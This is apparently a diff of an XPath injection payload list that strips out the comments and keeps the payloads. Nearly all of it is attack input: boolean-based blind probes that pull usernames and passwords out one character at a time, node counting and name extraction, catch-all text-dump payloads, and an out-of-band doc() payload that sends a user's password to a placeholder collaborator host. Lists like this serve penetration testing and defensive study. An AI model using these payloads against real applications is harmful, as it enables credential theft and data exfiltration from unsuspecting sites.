@@ -1,49 +1,29 @@
-# ============================================================
-# XPATH Injection — Blind Data Extraction
-# ============================================================
-
-# ---- Boolean-Based Blind ----
-# True/False conditions to extract characters one by one
-
-# Check string length of username
 ' and string-length(//user[1]/username/text())=5 and '1'='1
 ' and string-length(//user[1]/username/text())=6 and '1'='1
 
-# Check first character of username
 ' and substring(//user[1]/username/text(),1,1)='a' and '1'='1
 ' and substring(//user[1]/username/text(),1,1)='b' and '1'='1
 
-# Check first character of password
 ' and substring(//user[1]/password/text(),1,1)='a' and '1'='1
 
-# ---- Count Nodes ----
 ' and count(//user)=1 and '1'='1
 ' and count(//user)=2 and '1'='1
 ' and count(//*)=10 and '1'='1
 
-# ---- Extract Node Names ----
 ' and substring(name(/*[1]),1,1)='a' and '1'='1
 ' and string-length(name(/*[1]))=4 and '1'='1
 
-# ---- Navigate Document Structure ----
-# Root element
 /*[1]
-# Children
 /*[1]/*
-# Parent
 parent::*
-# Ancestors
 ancestor::*
 
-# ---- Extract All Text ----
 ' or 1=1]/text()[.='
 //text()
 //*[text()]
 
-# ---- OOB via doc() (if enabled) ----
 ' or doc('http://COLLABORATOR/?leak='+//user[1]/password/text()) or '1'='2
 
-# ---- String Functions ----
 string(//user[1]/password)
 substring(//user[1]/password,1,1)
 string-length(//user[1]/password)
